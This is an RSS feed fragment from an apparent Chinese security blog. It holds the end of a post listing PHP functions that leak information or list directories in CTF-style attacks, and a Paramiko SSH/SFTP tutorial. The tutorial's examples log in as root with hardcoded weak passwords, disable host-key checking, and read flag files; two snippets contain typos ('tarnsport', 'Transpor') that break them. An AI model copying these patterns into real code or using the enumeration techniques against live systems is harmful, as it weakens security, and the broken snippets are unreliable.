&lt;li&gt;import_request_variables  将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;列目录&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;glob&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt; glob ( &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt; [, &lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$flags&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; ] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;glob() 函数依照 libc glob() 函数使用的规则寻找所有与 pattern 匹配的文件路径，类似于一般 shells 所用的规则一样。不进行缩写扩展或参数替代。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;无参数获取信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#无参数获取信息&#34;&gt;#&lt;/a&gt; 无参数获取信息&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;get_defined_vars 返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。&lt;/li&gt;
&lt;li&gt;get_defined_constants 返回当前所有已定义的常量名和值。 这包含 define () 函数所创建的，也包含了所有扩展所创建的。&lt;/li&gt;
&lt;li&gt;get_defined_functions 返回一个包含所有已定义函数列表的多维数组&lt;/li&gt;
&lt;li&gt;get_included_files 返回所有被 include、 include_once、 require 和 require_once 的文件名。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;php 危险函数总结&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503135420288.png&#34; alt=&#34;image-20210503135420288&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503135446595.png&#34; alt=&#34;image-20210503135446595&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503135503196.png&#34; alt=&#34;image-20210503135503196&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/05/02/paramiko%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/</guid>
            <title>paramiko模块介绍</title>
            <link>https://chungod.github.io/2021/05/02/paramiko%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/</link>
            <category>paramiko模块介绍</category>
            <pubDate>Sun, 02 May 2021 19:54:29 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;paramiko模块介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#paramiko模块介绍&#34;&gt;#&lt;/a&gt; Paramiko 模块介绍&lt;/h2&gt;
&lt;p&gt;ssh 是一个协议，OpenSSH 是其中一个开源实现，paramiko 是 Python 的一个库，实现了 SSHv2 协议 (底层使用 cryptography)。&lt;/p&gt;
&lt;p&gt;有了 Paramiko 以后，我们就可以在 Python 代码中直接使用 SSH 协议对远程服务器执行操作，而不是通过 ssh 命令对远程服务器进行操作。&lt;/p&gt;
&lt;p&gt;由于 paramiko 属于第三方库，所以需要使用如下命令先行安装&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pip3 install paramiko&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;paramiko 包含两个核心组件：SSHClient 和 SFTPClient。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SSHClient 的作用类似于 Linux 的 ssh 命令，是对 SSH 会话的封装，该类封装了传输 (Transport)，通道 (Channel) 及 SFTPClient 建立的方法 (open_sftp)，通常用于执行远程命令。&lt;/li&gt;
&lt;li&gt;SFTPClient 的作用类似与 Linux 的 sftp 命令，是对 SFTP 客户端的封装，用以实现远程文件操作，如文件上传、下载、修改文件权限等操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;   			 Paramiko中的几个基础名词	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;、Channel：是一种类Socket，一种安全的SSH传输通道；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;、Transport：是一种加密的会话，使用时会同步创建了一个加密的Tunnels(通道)，这个Tunnels叫做Channel；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;、Session：是client与Server保持连接的对象，用connect()/start_client()/start_server()开始会话。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;paramiko的基本使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#paramiko的基本使用&#34;&gt;#&lt;/a&gt; Paramiko 的基本使用&lt;/h2&gt;
&lt;h4 id=&#34;sshclient常用的方法介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sshclient常用的方法介绍&#34;&gt;#&lt;/a&gt; SSHClient 常用的方法介绍&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;connect()&lt;/strong&gt;：实现远程服务器的连接与认证，对于该方法只有 hostname 是必传参数。&lt;/p&gt;
&lt;figure class=&#34;highlight cmd&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;常用参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hostname 连接的目标主机&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;port=SSH_PORT 指定端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;username=None 验证的用户名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;password=None 验证的用户密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pkey=None 私钥方式用于身份验证&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key_filename=None 一个文件名或文件列表，指定私钥文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;timeout=None 可选的tcp连接超时时间&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;allow_agent=True, 是否允许连接到ssh代理，默认为True 允许&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;look_for_keys=True 是否在~/.ssh中搜索私钥文件，默认为True 允许&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;compress=False, 是否打开压缩&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;set_missing_host_key_policy()&lt;/strong&gt;：设置远程服务器没有在 know_hosts 文件中记录时的应对策略。目前支持三种策略：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;设置连接的远程主机没有本地主机密钥或HostKeys对象时的策略，目前支持三种：&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;AutoAddPolicy 自动添加主机名及主机密钥到本地HostKeys对象，不依赖load_system_host_key的配置。即新建立ssh连接时不需要再输入yes或no进行确认&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WarningPolicy 用于记录一个未知的主机密钥的python警告。并接受，功能上和AutoAddPolicy类似，但是会提示是新连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RejectPolicy 自动拒绝未知的主机名和密钥，依赖load_system_host_key的配置。此为默认选项&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;exec_command()&lt;/strong&gt;：在远程服务器执行 Linux 命令的方法&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;open_sftp()&lt;/strong&gt;：在当前 ssh 会话的基础上创建一个 sftp 会话。该方法会返回一个 SFTPClient 对象。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 利用SSHClient对象的open_sftp()方法，可以直接返回一个基于当前连接的sftp对象，可以进行文件的上传等操作.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sftp = client.open_sftp()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sftp.put(&amp;#x27;test.txt&amp;#x27;,&amp;#x27;text.txt&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;sshclient常用的方法举例&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sshclient常用的方法举例&#34;&gt;#&lt;/a&gt; SSHClient 常用的方法举例&lt;/h4&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; paramiko&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;client = paramiko.SSHClient()  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 实例化SSHClient&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;client.set_missing_host_key_policy(paramiko.AutoAddPolicy())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 自动添加策略,保存服务器的主机名和密钥，如不添加,那么不在本地know_hosts文件中记录的文件无法连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;client.connect(hostname=&lt;span class=&#34;string&#34;&gt;&amp;#x27;10.7.5.238&amp;#x27;&lt;/span&gt;,port=&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;,username=&lt;span class=&#34;string&#34;&gt;&amp;#x27;root&amp;#x27;&lt;/span&gt;,password=&lt;span class=&#34;string&#34;&gt;&amp;#x27;123456&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 连接SSH服务端,以用户名和密码进行认证&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdin, stdout, stderr = client.exec_command(&lt;span class=&#34;string&#34;&gt;&amp;#x27;cat /root/flagvalue.txt&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# stdout为正确输出, stderr为错误输出, 同时是有一个变量有值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(stdout.read().decode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 打印执行结果&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;client.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 关闭SSHClient&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行结果:&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210111092549417.png&#34; alt=&#34;image-20210111094748230&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;密钥连接方式&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 配置私人密钥文件位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private = paramiko.RSAKey.from_private_key_file(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/Users/ch/.ssh/id_rsa&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#实例化SSHClient&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;client = paramiko.SSHClient()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#自动添加策略，保存服务器的主机名和密钥信息，如果不添加，那么不再本地know_hosts文件中记录的主机将无法连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;client.set_missing_host_key_policy(paramiko.AutoAddPolicy())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#连接SSH服务端，以用户名和密码进行认证&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;client.connect(hostname=&lt;span class=&#34;string&#34;&gt;&amp;#x27;10.0.0.1&amp;#x27;&lt;/span&gt;,port=&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;,username=&lt;span class=&#34;string&#34;&gt;&amp;#x27;root&amp;#x27;&lt;/span&gt;,pkey=private)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;SSHClient 封装 Transport&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; paramiko&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#创建一个通道&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;transport = paramiko.Transport((&lt;span class=&#34;string&#34;&gt;&amp;#x27;10.7.5.238&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tarnsport.connect(username=&lt;span class=&#34;string&#34;&gt;&amp;#x27;root&amp;#x27;&lt;/span&gt;, password=&lt;span class=&#34;string&#34;&gt;&amp;#x27;123&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh = paramiko.SSHClient()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh._transport = transport&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdin, stdout, stderr = ssh.exec_command(&lt;span class=&#34;string&#34;&gt;&amp;#x27;cat /root/flag*.txt&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(stdout.read().decode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;transport.close()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行结果:&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210111092624833.png&#34; alt=&#34;image-20210111092549417&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;sftpclient常用方法介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sftpclient常用方法介绍&#34;&gt;#&lt;/a&gt; SFTPClient 常用方法介绍&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SFTPCLient作为一个sftp的客户端对象，根据ssh传输协议的sftp会话，实现远程文件操作，如上传、下载、权限、状态&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from_transport(cls,t) 创建一个已连通的SFTP客户端通道&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;put(localpath, remotepath, callback=None, confirm=True) 将本地文件上传到服务器 参数confirm：是否调用stat()方法检查文件状态，返回ls -l的结果&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;get(remotepath, localpath, callback=None) 从服务器下载文件到本地&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir() 在服务器上创建目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;remove() 在服务器上删除目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rename() 在服务器上重命名目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stat() 查看服务器文件状态&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;listdir() 列出服务器目录下的文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;sftpclient常用方法举例&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sftpclient常用方法举例&#34;&gt;#&lt;/a&gt; SFTPClient 常用方法举例&lt;/h4&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; paramiko&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 获取Transport实例&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tran = paramiko.Transpor((&lt;span class=&#34;string&#34;&gt;&amp;#x27;10.7.5.238&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 连接SSH服务端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tran.connect(username=&lt;span class=&#34;string&#34;&gt;&amp;#x27;root&amp;#x27;&lt;/span&gt;,password=&lt;span class=&#34;string&#34;&gt;&amp;#x27;123456&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 